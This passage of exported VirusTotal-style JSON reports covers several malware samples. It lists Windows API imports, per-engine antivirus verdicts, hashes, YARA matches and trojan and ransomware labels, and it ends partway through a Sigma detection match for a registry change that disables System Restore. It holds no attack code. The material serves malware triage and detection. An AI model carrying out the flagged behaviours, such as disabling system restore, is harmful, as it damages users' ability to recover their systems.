              "DeleteObject",
              "SetTextColor"
            ]
          },
          {
            "library_name": "ADVAPI32.dll",
            "imported_functions": [
              "RegCreateKeyExW",
              "RegCloseKey",
              "RegNotifyChangeKeyValue",
              "RegOpenKeyExW",
              "RegDeleteKeyW",
              "CryptHashData",
              "RegQueryValueExW",
              "CryptCreateHash",
              "DuplicateToken",
              "RegEnumKeyW",
              "SetFileSecurityW",
              "LookupAccountNameW",
              "CryptReleaseContext",
              "SetServiceStatus",
              "RegisterServiceCtrlHandlerW",
              "RegEnumKeyExW",
              "OpenThreadToken",
              "CryptDestroyHash",
              "CryptAcquireContextW",
              "RegDeleteValueW",
              "RegSetValueExW",
              "FreeSid",
              "CryptGetHashParam",
              "RegEnumValueW",
              "AllocateAndInitializeSid",
              "CheckTokenMembership",
              "StartServiceCtrlDispatcherW",
              "SetThreadToken"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "GetStdHandle",
              "GetDriveTypeW",
              "GetConsoleOutputCP",
              "WaitForSingleObject",
              "HeapAlloc",
              "GetFileAttributesW",
              "GetExitCodeProcess",
              "FreeEnvironmentStringsA",
              "DeleteCriticalSection",
              "GetCurrentProcess",
              "GetConsoleMode",
              "GetLocaleInfoA",
              "SetErrorMode",
              "FreeEnvironmentStringsW",
              "lstrcatW",
              "SetStdHandle",
              "GetCPInfo",
              "lstrcmpiA",
              "GetStringTypeA",
              "GetDiskFreeSpaceW",
              "GetTempPathW",
              "GetSystemTimeAsFileTime",
              "HeapReAlloc",
              "GetStringTypeW",
              "FreeLibrary",
              "FindClose",
              "InterlockedDecrement",
              "MoveFileW",
              "SetFileAttributesW",
              "SetLastError",
              "TlsGetValue",
              "CopyFileW",
              "RemoveDirectoryW",
              "IsDebuggerPresent",
              "ExitProcess",
              "GetModuleFileNameA",
              "lstrcmpiW",
              "UnhandledExceptionFilter",
              "LoadLibraryExW",
              "MultiByteToWideChar",
              "GetCalendarInfoA",
              "GetPrivateProfileStringW",
              "SetFilePointer",
              "GetFullPathNameW",
              "CreateThread",
              "GetSystemDirectoryW",
              "SetUnhandledExceptionFilter",
              "MulDiv",
              "TerminateProcess",
              "SearchPathW",
              "WriteConsoleA",
              "SetCurrentDirectoryW",
              "GlobalAlloc",
              "GetVersion",
              "InterlockedIncrement",
              "IsBadHugeReadPtr",
              "WriteConsoleW",
              "InitializeCriticalSectionAndSpinCount",
              "HeapFree",
              "EnterCriticalSection",
              "SetHandleCount",
              "LoadLibraryW",
              "EndUpdateResourceW",
              "GetVersionExW",
              "GetOEMCP",
              "QueryPerformanceCounter",
              "GetTickCount",
              "TlsAlloc",
              "FlushFileBuffers",
              "LoadLibraryA",
              "RtlUnwind",
              "GetStartupInfoA",
              "GetWindowsDirectoryW",
              "GetFileSize",
              "OpenProcess",
              "GetPrivateProfileIntA",
              "CreateDirectoryW",
              "DeleteFileW",
              "GetProcAddress",
              "SetSystemTimeAdjustment",
              "GetTempFileNameW",
              "lstrcpyW",
              "GetModuleFileNameW",
              "ExpandEnvironmentStringsW",
              "FindNextFileW",
              "lstrcpyA",
              "GetComputerNameA",
              "FindFirstFileW",
              "lstrcmpW",
              "GlobalLock",
              "CreateFileW",
              "GetFileType",
              "TlsSetValue",
              "CreateFileA",
              "GetCurrentThreadId",
              "LeaveCriticalSection",
              "GetLastError",
              "LCMapStringW",
              "GetShortPathNameW",
              "lstrlenA",
              "GlobalFree",
              "GetConsoleCP",
              "LCMapStringA",
              "GetEnvironmentStringsW",
              "GlobalUnlock",
              "lstrlenW",
              "VirtualFree",
              "GetEnvironmentStrings",
              "CompareFileTime",
              "GetCurrentProcessId",
              "SetFileTime",
              "GetCommandLineW",
              "WideCharToMultiByte",
              "HeapSize",
              "GetCommandLineA",
              "WritePrivateProfileStringW",
              "lstrcpynW",
              "RaiseException",
              "TlsFree",
              "GetModuleHandleA",
              "ReadFile",
              "CloseHandle",
              "lstrcpynA",
              "GetACP",
              "GetModuleHandleW",
              "IsValidCodePage",
              "HeapCreate",
              "WriteFile",
              "CreateProcessW",
              "Sleep",
              "VirtualAlloc"
            ]
          },
          {
            "library_name": "SHELL32.dll",
            "imported_functions": [
              "SHGetFileInfoA",
              "ShellExecuteExA",
              "SHBrowseForFolderA",
              "SHBrowseForFolderW",
              "SHChangeNotify",
              "SHFileOperationW",
              "ShellExecuteW",
              "SHGetPathFromIDListW",
              "SHGetSpecialFolderLocation",
              "SHGetFileInfoW",
              "SHGetPathFromIDListA",
              "SHGetMalloc",
              "SHFileOperationA"
            ]
          },
          {
            "library_name": "ole32.dll",
            "imported_functions": [
              "CreateStreamOnHGlobal",
              "OleUninitialize",
              "CoTaskMemFree",
              "OleInitialize",
              "CoCreateInstance",
              "CLSIDFromString"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "SetFocus",
              "GetMessagePos",
              "LoadBitmapW",
              "PostQuitMessage",
              "LoadBitmapA",
              "SetWindowPos",
              "IsWindow",
              "DispatchMessageA",
              "EndPaint",
              "GetDC",
              "SendMessageW",
              "SendMessageA",
              "GetClassInfoW",
              "GetDlgItemTextW",
              "LoadImageW",
              "OpenClipboard",
              "GetWindowTextA",
              "DrawTextW",
              "DestroyWindow",
              "GetMessageA",
              "GetParent",
              "UpdateWindow",
              "SetClassLongW",
              "ShowWindow",
              "CharToOemBuffA",
              "PeekMessageW",
              "EnableWindow",
              "CharUpperW",
              "GetDlgItemTextA",
              "PeekMessageA",
              "TranslateMessage",
              "IsWindowEnabled",
              "GetWindow",
              "CharUpperA",
              "RegisterClassW",
              "LoadStringA",
              "SetClipboardData",
              "OemToCharBuffA",
              "EnableMenuItem",
              "GetWindowLongA",
              "CreateWindowExA",
              "OemToCharA",
              "FillRect",
              "CopyRect",
              "WaitForInputIdle",
              "CreateWindowExW",
              "GetWindowLongW",
              "CharNextW",
              "MapWindowPoints",
              "BeginPaint",
              "DefWindowProcW",
              "CharPrevW",
              "DefWindowProcA",
              "SendDlgItemMessageA",
              "GetSystemMetrics",
              "SetWindowLongW",
              "GetWindowRect",
              "PostMessageA",
              "SetWindowLongA",
              "CheckDlgButton",
              "CreateDialogParamW",
              "CreatePopupMenu",
              "SetWindowTextW",
              "SetTimer",
              "GetDlgItem",
              "ScreenToClient",
              "FindWindowExA",
              "LoadCursorA",
              "LoadIconA",
              "TrackPopupMenu",
              "LoadCursorW",
              "GetSystemMenu",
              "FindWindowExW",
              "DispatchMessageW",
              "SetForegroundWindow",
              "ExitWindowsEx",
              "CharToOemA",
              "EmptyClipboard",
              "EndDialog",
              "CharNextA",
              "SetWindowTextA",
              "SetMenu",
              "SetDlgItemTextA",
              "DialogBoxParamW",
              "MessageBoxA",
              "AppendMenuW",
              "wvsprintfA",
              "DialogBoxParamA",
              "MessageBoxIndirectW",
              "GetSysColor",
              "SetDlgItemTextW",
              "RegisterClassExA",
              "DestroyIcon",
              "IsWindowVisible",
              "SystemParametersInfoW",
              "InvalidateRect",
              "wsprintfA",
              "CallWindowProcW",
              "GetClientRect",
              "GetClassNameA",
              "SendMessageTimeoutW",
              "wsprintfW",
              "CloseClipboard",
              "SetCursor"
            ]
          },
          {
            "library_name": "COMCTL32.dll",
            "imported_functions": [
              "ImageList_Create",
              "ImageList_Destroy",
              "ImageList_AddMasked"
            ]
          }
        ],
        "entry_point": 44450
      },
      "magic": "PE32 executable for MS Windows (GUI) Intel 80386 32-bit",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 2,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 60,
        "undetected": 13
      },
      "meaningful_name": "mvyMacd.exe",
      "reputation": 0
    },
    "type": "file",
    "id": "d621bb588911e91904b6c1016006eceff57307472986a4bd443b4f20a9c0b1ba",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/d621bb588911e91904b6c1016006eceff57307472986a4bd443b4f20a9c0b1ba"
    }
  }
},
{
  "_id": {
    "$oid": "65aba87bed57d2350d0299bf"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [
        "e2569690f1d65d4c95b640750f6674233f51ef4395b34233b878dd373986c362.bin",
        "a35hx72L.txt",
        "yVgZxvGV.lnk"
      ],
      "last_modification_date": 1704704809,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 33419,
      "type_extension": "html",
      "last_submission_date": 1315190303,
      "last_analysis_results": {
        "nProtect": {
          "category": "undetected",
          "engine_name": "nProtect",
          "engine_version": "2011-09-04.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "11.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "5.400.0.1158",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "9.111.5083",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110902"
        },
        "TheHacker": {
          "category": "undetected",
          "engine_name": "TheHacker",
          "engine_version": "6.7.0.1.290",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110903"
        },
        "VirusBuster": {
          "category": "undetected",
          "engine_name": "VirusBuster",
          "engine_version": "14.0.200.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110903"
        },
        "NOD32": {
          "category": "undetected",
          "engine_name": "NOD32",
          "engine_version": "6436",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "F-Prot": {
          "category": "undetected",
          "engine_name": "F-Prot",
          "engine_version": "4.6.2.117",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "20111.2.0.82",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Norman": {
          "category": "undetected",
          "engine_name": "Norman",
          "engine_version": "6.07.11",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "ByteHero": {
          "category": "undetected",
          "engine_name": "ByteHero",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110822"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "9.500.0.1008",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "4.8.1351.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "eSafe": {
          "category": "undetected",
          "engine_name": "eSafe",
          "engine_version": "7.0.17.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "0.97.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "9.0.0.837",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "SUPERAntiSpyware": {
          "category": "malicious",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "4.40.0.1006",
          "result": "Rogue.Agent/Gen-Nullo[BIN]",
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "4.69.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Comodo": {
          "category": "undetected",
          "engine_name": "Comodo",
          "engine_version": "9994",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "9.0.16440.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "5.0.2.03300",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "10374",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "AntiVir": {
          "category": "undetected",
          "engine_name": "AntiVir",
          "engine_version": "7.11.14.92",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "9.500.0.1008",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110903"
        },
        "McAfee-GW-Edition": {
          "category": "undetected",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "2010.1D",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "5.1.0.11",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "eTrust-Vet": {
          "category": "undetected",
          "engine_name": "eTrust-Vet",
          "engine_version": "36.1.8537",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110902"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "13.0.900",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "2.0.3.7",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.7604",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2011.9.3.4655",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Prevx": {
          "category": "undetected",
          "engine_name": "Prevx",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "22",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Commtouch": {
          "category": "undetected",
          "engine_name": "Commtouch",
          "engine_version": "5.3.2.6",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "2011.09.04.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "3.12.16.4",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110902"
        },
        "PCTools": {
          "category": "undetected",
          "engine_name": "PCTools",
          "engine_version": "8.0.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "23.73.01.03",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110830"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "T3.1.1.107.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "4.3.370.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "10.0.0.1190",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "10.0.3.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Avast5": {
          "category": "undetected",
          "engine_name": "Avast5",
          "engine_version": "5.0.677.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        }
      },
      "trid": [
        {
          "file_type": "HyperText Markup Language with DOCTYPE",
          "probability": 80.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 19.3
        }
      ],
      "sha256": "e2569690f1d65d4c95b640750f6674233f51ef4395b34233b878dd373986c362",
      "tags": [],
      "last_analysis_date": 1315190303,
      "unique_sources": 0,
      "first_submission_date": 1315190303,
      "ssdeep": "384:SaysBQS33QYQgew6tdt6p8zTuH6PlirPz5jk0+ikXeVDTD97nQxFjbJqMnNoIx+t:SaysBpQYQfAIlirPz5Q0+Q8b0kx9Q",
      "md5": "cd1b8893a2b346263f046bb49e4cf26e",
      "sha1": "cd471ec67c29bf5aaaa9674c2935c9be39f920c6",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 0,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 1,
        "undetected": 43
      },
      "meaningful_name": "e2569690f1d65d4c95b640750f6674233f51ef4395b34233b878dd373986c362.bin",
      "reputation": -7
    },
    "type": "file",
    "id": "e2569690f1d65d4c95b640750f6674233f51ef4395b34233b878dd373986c362",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/e2569690f1d65d4c95b640750f6674233f51ef4395b34233b878dd373986c362"
    }
  }
},
{
  "_id": {
    "$oid": "65abaad60d11c2d01c368f87"
  },
  "data": {
    "attributes": {
      "type_description": "unknown",
      "type_tags": [],
      "names": [
        "5a5e00e260f27ada023c5e43decd8658",
        "aa",
        "ZDuXLlB.wbs",
        "qkyvLKOUC.ocx"
      ],
      "last_modification_date": 1705209487,
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 12367,
      "popular_threat_classification": {
        "suggested_threat_label": "crypted",
        "popular_threat_name": [
          {
            "count": 2,
            "value": "crypted"
          }
        ]
      },
      "last_submission_date": 1302894718,
      "last_analysis_results": {
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "11.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "5.400.0.1158",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "9.96.4398",
          "result": "Trojan",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "TheHacker": {
          "category": "undetected",
          "engine_name": "TheHacker",
          "engine_version": "6.7.0.1.175",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "VirusBuster": {
          "category": "undetected",
          "engine_name": "VirusBuster",
          "engine_version": "13.6.307.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "NOD32": {
          "category": "malicious",
          "engine_name": "NOD32",
          "engine_version": "6045",
          "result": "JS/Kryptik.AD",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "F-Prot": {
          "category": "malicious",
          "engine_name": "F-Prot",
          "engine_version": "4.6.2.117",
          "result": "IFrame.gen",
          "method": "blacklist",
          "engine_update": "20110414"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "20101.3.2.89",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Norman": {
          "category": "undetected",
          "engine_name": "Norman",
          "engine_version": "6.07.07",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "9.200.0.1012",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "4.8.1351.0",
          "result": "JS:IFrame-BI",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "eSafe": {
          "category": "undetected",
          "engine_name": "eSafe",
          "engine_version": "7.0.17.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "0.97.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "7.0.0.125",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2011.4.15.4412",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Comodo": {
          "category": "undetected",
          "engine_name": "Comodo",
          "engine_version": "8354",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "9.0.16440.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "5.0.2.03300",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "9022",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "AntiVir": {
          "category": "malicious",
          "engine_name": "AntiVir",
          "engine_version": "7.11.6.143",
          "result": "HTML/Crypted.Gen",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "9.200.0.1012",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "2010.1D",
          "result": "Heuristic.BehavesLike.JS.CodeUnfolding.C",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "4.64.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "eTrust-Vet": {
          "category": "undetected",
          "engine_name": "eTrust-Vet",
          "engine_version": "36.1.8274",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "13.0.900",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "2.0.3.7",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.6702",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "4.40.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Prevx": {
          "category": "undetected",
          "engine_name": "Prevx",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "22",
          "result": "JS:IFrame-BI ",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Commtouch": {
          "category": "undetected",
          "engine_name": "Commtouch",
          "engine_version": "5.2.11.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "2011.04.15.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "3.12.16.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "PCTools": {
          "category": "undetected",
          "engine_name": "PCTools",
          "engine_version": "7.0.3.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "23.53.04.05",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "T3.1.1.103.0",
          "result": "HTML.Crypted",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "4.2.257.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "10.0.0.1190",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "10.0.3.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Avast5": {
          "category": "malicious",
          "engine_name": "Avast5",
          "engine_version": "5.0.677.0",
          "result": "JS:IFrame-BI",
          "method": "blacklist",
          "engine_update": "20110415"
        }
      },
      "trid": [
        {
          "file_type": "HyperText Markup Language with DOCTYPE",
          "probability": 80.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 19.3
        }
      ],
      "sha256": "dcd3c8b00518a113f731de4548a66b84c11e52f8b8666e2626d95d90a7ecf241",
      "tags": [],
      "last_analysis_date": 1302894718,
      "unique_sources": 1,
      "first_submission_date": 1302894718,
      "ssdeep": "192:UhVqp+pbpVNoS9pbV3So0lxIL0JiJJ15JxJYJ4uuo3iGWvWVadki:Yu6vK1o0luG8BL",
      "md5": "5a5e00e260f27ada023c5e43decd8658",
      "sha1": "c3dd299b09480a768900996e9c6a6cc4aeff12a4",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 0,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 9,
        "undetected": 32
      },
      "meaningful_name": "5a5e00e260f27ada023c5e43decd8658",
      "reputation": -7
    },
    "type": "file",
    "id": "dcd3c8b00518a113f731de4548a66b84c11e52f8b8666e2626d95d90a7ecf241",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/dcd3c8b00518a113f731de4548a66b84c11e52f8b8666e2626d95d90a7ecf241"
    }
  }
},
{
  "_id": {
    "$oid": "65b4ee5b404d6739601e0d50"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T12515AE1373DE83A5C3B25133BA56BB01AEBB7C2506B1F59B2FD4093DE920161522E673",
      "vhash": "085056655d15655210b020023009f6z141b013ze2za0030e039z",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "Identifies compiled AutoIT script (as EXE).",
          "source": "https://github.com/bartblaze/Yara-rules",
          "author": "@bartblaze",
          "ruleset_name": "AutoIT",
          "rule_name": "AutoIT_Compiled",
          "ruleset_id": "0023c73876"
        },
        {
          "rule_name": "EXE_in_LNK",
          "description": "Identifies executable artefacts in shortcut (LNK) files.",
          "author": "@bartblaze",
          "ruleset_id": "002bb473a9",
          "ruleset_name": "LNK_Ruleset",
          "match_in_subfile": true,
          "source": "https://github.com/bartblaze/Yara-rules"
        },
        {
          "rule_name": "MSOffice_in_LNK",
          "description": "Identifies Microsoft Office artefacts in shortcut (LNK) files.",
          "author": "@bartblaze",
          "ruleset_id": "002bb473a9",
          "ruleset_name": "LNK_Ruleset",
          "match_in_subfile": true,
          "source": "https://github.com/bartblaze/Yara-rules"
        }
      ],
      "creation_date": 1458807380,
      "names": [
        "c4286d55d655b52e9616a6d6d3a388f76a796592.bin",
        "Zmauto.exe",
        "08c2d3fec8cd9fcced634df7ad0f3db164ffe0cbfc263e2d8be026afca05bfcb.exe",
        "zmauto.exe",
        "08c2d3fec8cd9fcced634df7ad0f3db164ffe0cbfc263e2d8be026afca05bfcb-dropped.bin"
      ],
      "signature_info": {
        "copyright": "www.microsoft.com.cn",
        "description": "Desktop Auto Run",
        "file version": "1.5.1.0",
        "comments": "http://www.autoitscript.com/autoit3/"
      },
      "last_modification_date": 1701369148,
      "type_tag": "peexe",
      "times_submitted": 4,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 884736,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.blocker/kdag",
        "popular_threat_category": [
          {
            "count": 17,
            "value": "trojan"
          },
          {
            "count": 7,
            "value": "ransomware"
          }
        ],
        "popular_threat_name": [
          {
            "count": 7,
            "value": "blocker"
          },
          {
            "count": 2,
            "value": "kdag"
          },
          {
            "count": 2,
            "value": "r002c0pbj23"
          }
        ]
      },
      "authentihash": "008785372e516263419f77bb7ab51da1b182a620173afd0dfb56f62ec3c132ec",
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "3.XX",
            "type": "Library",
            "name": "AutoIt"
          },
          {
            "version": "2012",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "info": "GUI32,admin",
            "version": "11.0",
            "type": "Linker",
            "name": "Microsoft Linker"
          }
        ]
      },
      "last_submission_date": 1676772990,
      "sigma_analysis_results": [
        {
          "rule_title": "Registry Disable System Restore",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "Details": "DWORD (0x00000001)",
                "RuleName": "Suspicious,ImageBeginWithBackslash",
